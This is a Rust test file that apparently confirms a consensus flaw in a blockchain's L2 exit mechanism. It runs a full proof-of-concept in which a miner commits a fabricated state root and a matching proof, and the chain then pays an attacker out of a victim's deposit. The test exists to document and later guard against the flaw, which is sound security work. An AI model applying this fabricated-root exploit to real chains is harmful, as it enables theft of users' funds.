//! C1 confirmation: a miner-supplied `l2_state_root` is never checked against
//! the real L2 state, so a fabricated root plus a self-consistent exit proof
//! releases sink deposits to an attacker.
//!
//! This test PROVES the flaw on the current code: it fabricates a one-leaf
//! state (an exit record for an attacker who never queued anything), commits
//! that root in an otherwise empty block, matures it, and releases it through
//! a permissionless exit claim. Consensus ACCEPTS the block and pays the
//! attacker out of another user's deposit. L2 replay records the claim as
//! `unbacked` — detection without rejection.
//!
//! DO NOT "fix" this test by deleting it. The correct fix is to make the
//! block validator reject any `l2_state_root` that differs from the root
//! computed by replaying L2 state; when that lands, rewrite the acceptance
//! assertions below into refusal assertions.
//!
//! Run with `cargo test -p srct-l2 --test bogus_root`.

use srct_core::block::GENESIS_TIMESTAMP_MS;
use srct_core::chain::{Chain, DEFAULT_MAX_ATTEMPTS};
use srct_core::exit::ExitClaim;
use srct_core::hash::Address;
use srct_core::mempool::Mempool;
use srct_core::params::NetworkParams;
use srct_core::state_root::{exit_record_leaf, prove_inclusion, state_root};
use srct_core::tx::{OutPoint, Output};
use srct_core::wallet::Wallet;
use srct_l2::{ChainL2, DepositParams, L2Config, L2Genesis};

use srct_core::bls_checkpoint::MockBls;

const SINK_VALUE: u64 = 100_000_000; // 1 SRCT deposit by the victim
const EXIT_FEE: u64 = 1_000_000;

fn wallet(seed: u8) -> Wallet {
    Wallet::from_private_key_bytes(&[seed; 32], "bogus-root").unwrap()
}

fn addr(w: &Wallet) -> Address {
    w.address().unwrap()
}

fn ts(h: u64) -> u64 {
    GENESIS_TIMESTAMP_MS + h * 1_000
}

fn l2config() -> L2Config {
    let mut c = L2Config::mini();
    c.exit_activation_height = 1;
    c
}

fn l2view(chain: &Chain) -> ChainL2 {
    let params = NetworkParams::mini();
    ChainL2::replay(
        chain,
        l2config(),
        &L2Genesis::for_params(&params),
        DepositParams::for_params(&params),
        &MockBls,
    )
    .unwrap()
}

fn mine_empty_to(chain: &mut Chain, miner: Address, to: u64) {
    while chain.height() < to {
        let h = chain.height() + 1;
        let b = chain.mine_block(miner, vec![], ts(h)).unwrap();
        chain.submit(b).unwrap();
    }
}

fn mature_outpoint(chain: &Chain, miner: Address) -> (OutPoint, u64) {
    chain
        .utxo()
        .iter()
        .filter(|(_, u)| u.out.address == miner && chain.is_mature(u.height))
        .map(|(op, u)| (op, u.out.value))
        .next()
        .expect("a mature coinbase")
}

fn fee_for(chain: &Chain, n_in: usize, n_out: usize) -> u64 {
    chain
        .expected_base_fee_for_next_block()
        .saturating_mul(16_000 + 1_000 * n_in as u64 + 250 * n_out as u64)
        .saturating_add(1_000_000)
}

/// Victim deposits 1 SRCT to the sink; the attacker holds no L2 balance and
/// queues nothing. Returns `(chain, victim, attacker, deposit_height)`.
fn deposited_world() -> (Chain, Wallet, Wallet, u64) {
    let params = NetworkParams::mini();
    let victim = wallet(9);
    let me = addr(&victim);
    let mut chain = Chain::new(params.clone()).unwrap();
    mine_empty_to(&mut chain, me, 12);
    let (op, value) = mature_outpoint(&chain, me);
    let fee = fee_for(&chain, 1, 2);
    let tx = victim
        .build_tx(
            &[op],
            vec![
                Output {
                    value: SINK_VALUE,
                    address: params.l2_deposit_sink(),
                },
                Output {
                    value: value - SINK_VALUE - fee,
                    address: me,
                },
            ],
            fee,
        )
        .unwrap();
    let d = chain.height() + 1;
    let b = chain.mine_block(me, vec![tx], ts(d)).unwrap();
    chain.submit(b).unwrap();
    mine_empty_to(&mut chain, me, d + 20);
    (chain, victim, wallet(7), d)
}

#[test]
fn fabricated_root_exit_drains_sink_and_replays_as_unbacked() {
    let (mut chain, victim, attacker, _d) = deposited_world();
    let miner = addr(&victim);
    let thief = addr(&attacker);
    // Empty blocks pin the base fee at its floor, so the claim amount has
    // to be stable from fabrication to release.
    assert_eq!(chain.expected_base_fee_for_next_block(), 10);
    let gas = 16_000 + 1_000 + 2 * 250;
    let l1_fee = 10 * gas;
    let amount = SINK_VALUE - EXIT_FEE - l1_fee;

    // The attacker fabricates a one-leaf L2 state containing only their own
    // exit record — no queue transaction was ever mined, no deposit backs it.
    let nonce = 1u64;
    let dest = thief;
    let q = chain.height() + 1;
    let leaf = exit_record_leaf(&thief, nonce, amount, &dest, EXIT_FEE, q);
    let bogus_root = state_root(&[leaf]);
    let proof = prove_inclusion(&[leaf], 0).expect("one leaf proves itself");

    // Consensus places no honesty constraint on the committed root: an empty
    // L2 section carrying an arbitrary root is structurally valid.
    let qb = chain
        .mine_block_with_l2_root(
            miner,
            vec![],
            vec![],
            bogus_root,
            ts(q),
            None,
            DEFAULT_MAX_ATTEMPTS,
        )
        .unwrap();
    chain.submit(qb).unwrap();
    assert_eq!(
        chain.block_at(q).unwrap().l2_state_root,
        Some(bogus_root),
        "the fabricated root is committed without any check"
    );

    // Mature under the depth rule, then release through the permissionless
    // claim path. The proof verifies against the fabricated root, the sink
    // input funds it exactly, and nothing else is consulted.
    mine_empty_to(&mut chain, miner, q + 20);
    let sink_op = chain
        .utxo()
        .outputs_for_address(&NetworkParams::mini().l2_deposit_sink())
        .into_iter()
        .next()
        .expect("the victim deposit sink output")
        .0;
    let claim = ExitClaim {
        owner: thief,
        nonce,
        amount_sat: amount,
        destination: dest,
        claimant: miner,
        exit_fee_sat: EXIT_FEE,
        queued_height: q,
        inputs: vec![sink_op],
        proof,
    };
    assert!(claim.verify_proof(&bogus_root));
    let h = chain.height() + 1;
    chain
        .mine_from_pool_with_exits(
            &mut Mempool::new(1 << 20),
            miner,
            ts(h),
            vec![],
            vec![claim],
            None,
        )
        .unwrap();

    // C1: the chain paid the attacker out of the victim's deposit.
    let dest_got: u64 = chain
        .utxo()
        .outputs_for_address(&dest)
        .iter()
        .map(|(_, v)| v)
        .sum();
    assert_eq!(
        dest_got, amount,
        "fabricated exit released the victim deposit to the attacker"
    );
    assert!(chain.exit_released(&thief, nonce));

    // Detection without rejection: an honest node's L2 replay — which never
    // saw a queue for (thief, 1) — flags the paid claim as unbacked.
    let l2 = l2view(&chain);
    assert!(
        l2.unbacked_claims()
            .iter()
            .any(|u| u.owner == thief && u.nonce == nonce),
        "replay must record the fabricated release as unbacked"
    );
}
